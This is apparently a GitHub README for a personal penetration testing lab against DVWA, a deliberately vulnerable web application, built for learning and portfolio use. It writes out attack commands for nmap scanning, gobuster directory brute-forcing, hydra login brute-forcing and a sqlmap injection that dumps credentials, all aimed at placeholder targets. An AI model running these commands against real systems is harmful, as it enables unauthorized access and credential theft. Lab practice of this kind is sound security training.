DVWA Penetration Testing Lab

A hands-on penetration testing project built to simulate a real-world attack/defense environment using Damn Vulnerable Web Application (DVWA).
Configured and executed on a controlled lab network to practice ethical hacking techniques and demonstrate practical cybersecurity skills.


🎯 Objective


	•	Build a contained penetration testing lab to practice ethical hacking techniques.
	•	Simulate a full attack lifecycle from reconnaissance to exploitation and  post-exploitation.
	•	Demonstrate proficiency with industry-standard tools and document results professionally

🔧 Features
	•	Reconnaissance
	•	Nmap scan for open ports and service enumeration
	•	Gobuster directory brute-forcing
	•	Exploitation
	•	Hydra brute-force attack on DVWA login
	•	Manual and automated SQL Injection (SQLMap)
	•	Post-Exploitation
	•	Extracting DVWA database user credentials
	•	Saving and documenting exploitation results
	•	Documentation
	•	Sanitized DVWA configuration file
	•	Step-by-step attack methodology
	•	Screenshots for every major phase

----

📂 Repository Structure

dvwa-penetration-testing-lab
├── attack-scripts       # Output logs from tools
│   ├── gobuster_scan.txt
│   ├── hydra_bruteforce.txt
│   ├── nmap_scan.txt
│   └── sqlmap_dump.txt
├── configs              # Sanitized config files
│   └── dvwa-config.sample.php
├── docs                 # Attack methodology & notes
│   └── attack-steps.md
├── screenshots          # Evidence (IPs blurred)
└── README.md

----
🧪 How to Reproduce

1.	Set up DVWA
	•	Deploy DVWA on Parrot/Kali or any Debian-based VM
	•	Configure database credentials in dvwa-config.php

2.	Recon

nmap -sV <target-ip> -oN attack-scripts/nmap_scan.txt
gobuster dir -u http://<target-ip>/ -w /path/to/wordlist -o attack-scripts/gobuster_scan.txt

---

3. Brute Force

hydra -l admin -P /path/to/wordlist http://<target-ip>/dvwa/login.php -V -o attack-scripts/hydra_bruteforce.txt

---

4. SQL Injection

sqlmap -u "http://<target-ip>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session-id>; security=low" \
  --batch --level=5 --risk=3 --dump -o attack-scripts/sqlmap_dump.txt
---

5. Evidence Collection

	•	Save all tool outputs in attack-scripts/.
	•	Capture relevant screenshots with IPs sanitized.
	•	Write up findings in docs/attack-steps.md.

---
📌 Use Case

This project simulates real-world penetration testing methodology for learning and portfolio building.
It covers all key phases — Reconnaissance, Exploitation, and Post-Exploitation — in a safe, legal lab.

---

🖥️ Requirements

	•	DVWA installed on a Debian-based environment
	•	Kali/Parrot OS with:
	•	Nmap
	•	Gobuster
	•	Hydra
	•	SQLMap

---

📄 License

MIT License – free to use, share, and modify with attribution.

---

👤 Author

*Amir Nejad*
https://www.linkedin.com/in/amir-nejad98 * https://github.com/Amirnejad35


